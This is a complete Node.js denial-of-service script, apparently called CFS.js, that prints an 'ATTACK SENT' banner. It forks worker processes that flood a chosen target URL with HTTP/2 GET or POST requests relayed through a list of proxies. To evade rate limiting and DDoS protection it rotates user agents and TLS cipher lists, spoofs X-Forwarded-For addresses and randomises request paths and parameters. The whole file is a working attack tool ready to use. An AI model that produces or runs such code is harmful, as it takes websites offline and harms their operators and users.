process.on('uncaughtException', function(er) {
});
process.on('unhandledRejection', function(er) {
});
require('events').EventEmitter.defaultMaxListeners = 0;
const fs = require('fs');
const url = require('url');
const randstr = require('randomstring');

var path = require("path");
const cluster = require('cluster');
const http2 = require('http2');

var fileName = __filename;
var file = path.basename(fileName);

let headerbuilders;
let COOKIES = undefined;
let POSTDATA = undefined;

if (process.argv.length < 8){
    console.log('node CFS.js [Target] [Time] [Threads] [Method] [Proxy List] [Requests Per IP]');
    process.exit(0);
}

let randomparam = false;

var proxies = fs.readFileSync(process.argv[6], 'utf-8').toString().replace(/\r/g, '').split('\n');
var rate = process.argv[7];
var target_url = process.argv[2];
const target = target_url.split('""')[0];

process.argv.forEach((ss) => {
    if (ss.includes("cookie=") && !process.argv[5].split('""')[0].includes(ss)){
        COOKIES = ss.slice(7);
    } else if (ss.includes("postdata=") && !process.argv[5].split('""')[0].includes(ss)){
        if (process.argv[5].toUpperCase() != "POST"){
            console.error("Method Invalid (Has Postdata But Not POST Method)")
            process.exit(1);
        }
        POSTDATA = ss.slice(9);
    } else if (ss.includes("randomstring=")){
        randomparam = ss.slice(13);
        console.log("[Info] RandomString Mode Enabled.");
    } else if (ss.includes("headerdata=")){
        headerbuilders = {
            "accept": 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            "accept-encoding": 'gzip, deflate, br',
            "accept-language": 'en-US,en;q=0.9',
            "sec-ch-ua": 'Not A;Brand";v="99", "Chromium";v="99", "Opera";v="86", "Microsoft Edge";v="100", "Google Chrome";v="101"',
            "sec-ch-ua-mobile": '?0',
            "sec-ch-ua-platform": '"Windows"',
            "sec-fetch-dest": 'empty',
            "sec-fetch-site": 'cross-site',
            "sec-fetch-mode": 'navigate',
            "sec-fetch-user": '?1',
            "TE": 'trailers',
            "Pragma": 'no-cache',
            "upgrade-insecure-requests": 1,
            "Cache-Control": "max-age=0",
            "Referer": target,
            "X-Forwarded-For":spoof(),
            "Cookie": COOKIES,
            ":method":"GET"
        };
        if (ss.slice(11).split('""')[0].includes("&")) {
            const hddata = ss.slice(11).split('""')[0].split("&");
            for (let i = 0; i < hddata.length; i++) {
                const head = hddata[i].split("=")[0];
                const dat = hddata[i].split("=")[1];
                headerbuilders[head] = dat;
            }
        } else {
            const hddata = ss.slice(11).split('""')[0];
            const head = hddata.split("=")[0];
            const dat = hddata.split("=")[1];
            headerbuilders[head] = dat;
        }
    }
});
if (COOKIES !== undefined){
    console.log("[Info] Custom Cookie Mode Enabled.");
} else {
    COOKIES = "";
}
if (POSTDATA !== undefined){
    console.log("[Info] Custom PostData Mode Enabled.");
} else {
    POSTDATA = "";
}
if (headerbuilders !== undefined){
    console.log("[Info] Custom HeaderData Mode Enabled.");
    if (cluster.isMaster){
        for (let i = 0; i < process.argv[7]; i++){
            cluster.fork();
        }
      console.log("\x1b[32m     █████╗ ████████╗████████╗ █████╗  ██████╗██╗  ██╗    ███████╗███████╗███╗   ██╗████████╗  ")
      console.log("\x1b[32m    ██╔══██╗╚══██╔══╝╚══██╔══╝██╔══██╗██╔════╝██║ ██╔╝    ██╔════╝██╔════╝████╗  ██║╚══██╔══╝  ")
      console.log("\x1b[32m    ███████║   ██║      ██║   ███████║██║     █████╔╝     ███████╗█████╗  ██╔██╗ ██║   ██║     ")
      console.log("\x1b[32m    ██╔══██║   ██║      ██║   ██╔══██║██║     ██╔═██╗     ╚════██║██╔══╝  ██║╚██╗██║   ██║     ")
      console.log("\x1b[32m    ██║  ██║   ██║      ██║   ██║  ██║╚██████╗██║  ██╗    ███████║███████╗██║ ╚████║   ██║     ")  
      console.log("\x1b[32m    ╚═╝  ╚═╝   ╚═╝      ╚═╝   ╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝    ╚══════╝╚══════╝╚═╝  ╚═══╝   ╚═╝     ") 
        setTimeout(() => {
            process.exit(1);
        }, process.argv[3] * 1000);
    } else {
        startflood();
    }
} else {
    headerbuilders = {
            "accept": 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            "accept-encoding": 'gzip, deflate, br',
            "accept-language": 'en-US,en;q=0.9',
            "sec-ch-ua": 'Not A;Brand";v="99", "Chromium";v="99", "Opera";v="86", "Microsoft Edge";v="100", "Google Chrome";v="101"',
            "sec-ch-ua-mobile": '?0',
            "sec-ch-ua-platform": '"Windows"',
            "sec-fetch-dest": 'empty',
            "sec-fetch-site": 'cross-site',
            "sec-fetch-mode": 'navigate',
            "sec-fetch-user": '?1',
            "TE": 'trailers',
            "Pragma": 'no-cache',
            "upgrade-insecure-requests": 1,
            "Cache-Control": "max-age=0",
            "Referer": target,
            "X-Forwarded-For":spoof(),
            "Cookie": COOKIES,
            ":method":"GET"
    }
    if (cluster.isMaster){
        for (let i = 0; i < process.argv[7]; i++){
            cluster.fork();
        }
      console.log("\x1b[32m     █████╗ ████████╗████████╗ █████╗  ██████╗██╗  ██╗    ███████╗███████╗███╗   ██╗████████╗  ")
      console.log("\x1b[32m    ██╔══██╗╚══██╔══╝╚══██╔══╝██╔══██╗██╔════╝██║ ██╔╝    ██╔════╝██╔════╝████╗  ██║╚══██╔══╝  ")
      console.log("\x1b[32m    ███████║   ██║      ██║   ███████║██║     █████╔╝     ███████╗█████╗  ██╔██╗ ██║   ██║     ")
      console.log("\x1b[32m    ██╔══██║   ██║      ██║   ██╔══██║██║     ██╔═██╗     ╚════██║██╔══╝  ██║╚██╗██║   ██║     ")
      console.log("\x1b[32m    ██║  ██║   ██║      ██║   ██║  ██║╚██████╗██║  ██╗    ███████║███████╗██║ ╚████║   ██║     ")  
      console.log("\x1b[32m    ╚═╝  ╚═╝   ╚═╝      ╚═╝   ╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝    ╚══════╝╚══════╝╚═╝  ╚═══╝   ╚═╝     ") 
    
        setTimeout(() => {
            process.exit(1);
        }, process.argv[3] * 1000);
    } else {
        startflood();
    }
}

var parsed = url.parse(target);
process.setMaxListeners(0);

function ra() {
    const rsdat = randstr.generate({
        "charset":"0123456789ABCDEFGHIJKLMNOPQRSTUVWSYZabcdefghijklmnopqrstuvwsyz0123456789",
        "length":4
    });
    return rsdat;
}

const UAs = [
"Mozilla/5.0 (iPhone; CPU iPhone OS 13_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.1 Mobile/15E148 Safari/604.1",
"Mozilla/5.0 (iPhone; CPU iPhone OS 16_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/114.0.5735.99 Mobile/15E148 Safari/604.1",
"Mozilla/5.0 (iPad; CPU OS 16_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/114.0.5735.124 Mobile/15E148 Safari/604.1",
"Mozilla/5.0 (iPhone; CPU iPhone OS 16_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/114.1 Mobile/15E148 Safari/605.1.15",
"Mozilla/5.0 (iPhone; CPU iPhone OS 16_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 YaBrowser/23.5.6.403.10 SA/3 Mobile/15E148 Safari/604.1",
"Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 13; SAMSUNG SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/21.0 Chrome/110.0.5481.154 Mobile Safari/537.36",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36 OPR/99.0.0.0",
"Opera/9.80 (Android; Opera Mini/7.5.33942/191.308; U; en) Presto/2.12.423 Version/12.16",
"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/534.24 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/534.24 XiaoMi/MiuiBrowser/13.30.1-gn",
"Mozilla/5.0 (Linux; Android 10; JNY-LX1; HMSCore 6.11.0.302) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.88 HuaweiBrowser/13.0.5.303 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; U; Android 11; en-us; itel P661W Build/RP1A.201005.001) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36 PHX/12.9",
"Mozilla/5.0 (Linux; Android 13; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Mobile Safari/537.36 EdgA/113.0.1774.63",
"Mozilla/5.0 (Linux; arm_64; Android 12; CPH2205) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 YaBrowser/23.3.3.86.00 SA/3 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; U; Android 4.4.2; en-US; HM NOTE 1W Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.0.5.850 U3/0.8.0 Mobile Safari/534.30",
"Mozilla/5.0 (Linux; Android 8.1.0; vivo 1820 Build/O11019; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 VivoBrowser/10.4.2.0",
"Mozilla/5.0 (Linux; U; Android 13; vi-vn; CPH2159 Build/TP1A.220905.001) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.88 Mobile Safari/537.36 HeyTapBrowser/45.9.5.1.1",
"Mozilla/5.0 (Android 13; Mobile; rv:109.0) Gecko/114.0 Firefox/114.0",
"Mozilla/5.0 (Linux; Android 5.1.1; KFSUWI) AppleWebKit/537.36 (KHTML, like Gecko) Silk/108.4.6 like Chrome/108.0.5359.220 Safari/537.36",
];

function spoof(){
    return `${randstr.generate({ length:1, charset:"12" })}${randstr.generate({ length:1, charset:"012345" })}${randstr.generate({ length:1, charset:"012345" })}.${randstr.generate({ length:1, charset:"12" })}${randstr.generate({ length:1, charset:"012345" })}${randstr.generate({ length:1, charset:"012345" })}.${randstr.generate({ length:1, charset:"12" })}${randstr.generate({ length:1, charset:"012345" })}${randstr.generate({ length:1, charset:"012345" })}.${randstr.generate({ length:1, charset:"12" })}${randstr.generate({ length:1, charset:"012345" })}${randstr.generate({ length:1, charset:"012345" })}`;
}

const cplist = [
    "options2.TLS_AES_128_GCM_SHA256:options2.TLS_AES_256_GCM_SHA384:options2.TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA:options2.TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA256:options2.TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256:options2.TLS_ECDHE_ECDSA_WITH_AES_256_CBC_SHA:options2.TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384:options2.TLS_ECDHE_ECDSA_WITH_RC4_128_SHA:options2.TLS_RSA_WITH_AES_128_CBC_SHA:options2.TLS_RSA_WITH_AES_128_CBC_SHA256:options2.TLS_RSA_WITH_AES_128_GCM_SHA256:options2.TLS_RSA_WITH_AES_256_CBC_SHA",
    "TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_128_GCM_SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA256:ECDHE-RSA-AES256-SHA384:DHE-RSA-AES256-SHA384:ECDHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA256:HIGH:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!MD5:!PSK:!SRP:!CAMELLIA",
    ":ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:DHE-DSS-AES128-GCM-SHA256:kEDH+AESGCM:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-DSS-AES128-SHA256:DHE-RSA-AES256-SHA256:DHE-DSS-AES256-SHA:DHE-RSA-AES256-SHA:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!3DES:!MD5:!PSK",
    "RC4-SHA:RC4:ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!MD5:!aNULL:!EDH:!AESGCM",
    "ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM",
    "ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH"
];

function startflood(){

    if (process.argv[5].toUpperCase() == "POST"){
        const tagpage = url.parse(target).path.replace("%RAND%",ra())
        headerbuilders[":method"] = "POST"
        headerbuilders["Content-Type"] = "text/plain"
        if (randomparam) {
            setInterval(() => {

                headerbuilders["User-agent"] = UAs[Math.floor(Math.random() * UAs.length)]

                var cipper = cplist[Math.floor(Math.random() * cplist.length)];

                var proxy = proxies[Math.floor(Math.random() * proxies.length)];

                proxy = proxy.split(':');
            
                var http = require('http'),
                    tls = require('tls');
                    
                tls.DEFAULT_MAX_VERSION = 'TLSv1.3';
            
                var req = http.request({ 
                    host: proxy[0],
                    port: proxy[1],
                    ciphers: cipper,
                    method: 'CONNECT',
                    path: parsed.host + ":443"
                }, (err) => {
                    req.end();
                    return;
                });
            
                req.on('connect', function (res, socket, head) { 
                        const client = http2.connect(parsed.href, {
                            createConnection: () => tls.connect({
                                host: parsed.host,
                                ciphers: cipper,
                                secureProtocol: 'TLS_method',
                                servername: parsed.host,
                                challengesToSolve: 5,
                                cloudflareTimeout: 5000,
                                cloudflareMaxTimeout: 30000,
                                maxRedirects: 20,
                                followAllRedirects: true,
                                decodeEmails: false,
                                gzip: true,
                                servername: parsed.host,
                                secure: true,
                                rejectUnauthorized: false,
                                ALPNProtocols: ['h2'],
                                socket: socket
                            }, function () {
                                for (let i = 0; i< rate; i++){
                                    headerbuilders[":path"] = `${url.parse(target).path.replace("%RAND%",ra())}?${randomparam}=${randstr.generate({length:12,charset:"ABCDEFGHIJKLMNOPQRSTUVWSYZabcdefghijklmnopqrstuvwsyz0123456789"})}`
                                    headerbuilders["X-Forwarded-For"] = spoof();
                                    headerbuilders["Body"] = `${POSTDATA.includes("%RAND%") ? POSTDATA.replace("%RAND%",ra()) : POSTDATA}`
                                    headerbuilders["Cookie"].replace("%RAND%",ra());
                                    const req = client.request(headerbuilders);
                                    req.end();
                                    req.on("response", () => {
                                        req.close();
                                    })
                                }
                            })
                        });
                    });
                    req.end();
                });
        } else {
            setInterval(() => {

                headerbuilders["User-agent"] = UAs[Math.floor(Math.random() * UAs.length)]

                var cipper = cplist[Math.floor(Math.random() * cplist.length)];

                var proxy = proxies[Math.floor(Math.random() * proxies.length)];
                proxy = proxy.split(':');
            
                var http = require('http'),
                    tls = require('tls');
                    
                tls.DEFAULT_MAX_VERSION = 'TLSv1.3';
            
                var req = http.request({ 
                    host: proxy[0],
                    port: proxy[1],
                    ciphers: cipper,
                    method: 'CONNECT',
                    path: parsed.host + ":443"
                }, (err) => {
                    req.end();
                    return;
                });
            
                req.on('connect', function (res, socket, head) { 
                        const client = http2.connect(parsed.href, {
                            createConnection: () => tls.connect({
                                host: `${(url.parse(target).path.includes("%RAND%")) ? tagpage : url.parse(target).path}`,
                                ciphers: cipper,
                                secureProtocol: 'TLS_method',
                                servername: parsed.host,
                                challengesToSolve: 5,
                                cloudflareTimeout: 5000,
                                cloudflareMaxTimeout: 30000,
                                maxRedirects: 20,
                                followAllRedirects: true,
                                decodeEmails: false,
                                gzip: true,
                                servername: parsed.host,
                                secure: true,
                                rejectUnauthorized: false,
                                ALPNProtocols: ['h2'],
                                socket: socket
                            }, function () {
                                for (let i = 0; i< rate; i++){
                                    headerbuilders[":path"] = `${url.parse(target).path.replace("%RAND%",ra())}`
                                    headerbuilders["X-Forwarded-For"] = spoof();
                                    headerbuilders["Body"] = `${POSTDATA.includes("%RAND%") ? POSTDATA.replace("%RAND%",ra()) : POSTDATA}`
                                    headerbuilders["Cookie"].replace("%RAND%",ra());
                                    const req = client.request(headerbuilders);
                                    req.end();
                                    req.on("response", () => {
                                        req.close();
                                    })
                                }
                            })
                        });
                    });
                    req.end();
                });
        }
    } else if (process.argv[5].toUpperCase() == "GET") {
        headerbuilders[":method"] = "GET"
        if (randomparam){
            setInterval(() => {

                headerbuilders["User-agent"] = UAs[Math.floor(Math.random() * UAs.length)]

                var cipper = cplist[Math.floor(Math.random() * cplist.length)];

                var proxy = proxies[Math.floor(Math.random() * proxies.length)];
                proxy = proxy.split(':');
            
                var http = require('http'),
                    tls = require('tls');
                    
                tls.DEFAULT_MAX_VERSION = 'TLSv1.3';
            
                var req = http.request({ 
                    host: proxy[0],
                    port: proxy[1],
                    ciphers: cipper,
                    method: 'CONNECT',
                    path: parsed.host + ":443"
                }, (err) => {
                    req.end();
                    return;
                });
            
                req.on('connect', function (res, socket, head) { 
                        const client = http2.connect(parsed.href, {
                            createConnection: () => tls.connect({
                                host: parsed.host,
                                ciphers: cipper,
                                secureProtocol: 'TLS_method',
                                servername: parsed.host,
                                challengesToSolve: 5,
                                cloudflareTimeout: 5000,
                                cloudflareMaxTimeout: 30000,
                                maxRedirects: 20,
                                followAllRedirects: true,
                                decodeEmails: false,
                                gzip: true,
                                servername: parsed.host,
                                secure: true,
                                rejectUnauthorized: false,
                                ALPNProtocols: ['h2'],
                                socket: socket
                            }, function () {
                                for (let i = 0; i< rate; i++){
                                    headerbuilders[":path"] = `${url.parse(target).path.replace("%RAND%",ra())}?${randomparam}=${randstr.generate({length:12,charset:"ABCDEFGHIJKLMNOPQRSTUVWSYZabcdefghijklmnopqrstuvwsyz0123456789"})}`
                                    headerbuilders["X-Forwarded-For"] = spoof();
                                    headerbuilders["Cookie"].replace("%RAND%",ra());
                                    const req = client.request(headerbuilders);
                                    req.end();
                                    req.on("response", () => {
                                        req.close();
                                    })
                                }
                            })
                        });
                    });
                    req.end();
                });
        } else {
            setInterval(() => {

                headerbuilders["User-agent"] = UAs[Math.floor(Math.random() * UAs.length)]

                var cipper = cplist[Math.floor(Math.random() * cplist.length)];

                var proxy = proxies[Math.floor(Math.random() * proxies.length)];
                proxy = proxy.split(':');
            
                var http = require('http'),
                    tls = require('tls');
                    
                tls.DEFAULT_MAX_VERSION = 'TLSv1.3';
            
                var req = http.request({ 
                    host: proxy[0],
                    port: proxy[1],
                    ciphers: cipper,
                    method: 'CONNECT',
                    path: parsed.host + ":443"
                }, (err) => {
                    req.end();
                    return;
                });
            
                req.on('connect', function (res, socket, head) { 
                        const client = http2.connect(parsed.href, {
                            createConnection: () => tls.connect({
                                host: parsed.host,
                                ciphers: cipper,
                                secureProtocol: 'TLS_method',
                                servername: parsed.host,
                                challengesToSolve: 5,
                                cloudflareTimeout: 5000,
                                cloudflareMaxTimeout: 30000,
                                maxRedirects: 20,
                                followAllRedirects: true,
                                decodeEmails: false,
                                gzip: true,
                                servername: parsed.host,
                                secure: true,
                                rejectUnauthorized: false,
                                ALPNProtocols: ['h2'],
                                socket: socket
                            }, function () {
                                for (let i = 0; i< rate; i++){
                                    headerbuilders[":path"] = `${url.parse(target).path.replace("%RAND%",ra())}`
                                    headerbuilders["X-Forwarded-For"] = spoof();
                                    headerbuilders["Cookie"].replace("%RAND%",ra());
                                    const req = client.request(headerbuilders);
                                    req.end();
                                    req.on("response", () => {
                                        req.close();
                                    })
                                }
                            })
                        });
                    });
                    req.end();
                });
        }
    } else {
        console.log("[Info] Invalid Method.");
        process.exit(1);
    }

}
